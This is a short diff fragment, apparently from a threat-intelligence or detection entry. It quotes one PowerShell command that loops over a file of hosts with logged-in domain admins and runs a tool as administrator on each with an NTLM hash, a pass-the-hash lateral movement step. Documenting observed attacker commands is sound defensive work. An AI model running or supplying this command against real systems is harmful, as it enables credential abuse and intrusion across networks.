@@ -16,3 +16,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 powershell foreach ($target in (get-content c:\users\username\appdata\local\temp\hosts_da_loggedin_unique.txt)) { "[*] $Target:"; (c:\programdata\sd.exe ./administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:a4bab1c7d4bef62d4c22043ddbf1312c) }`
 
 ```
+
+
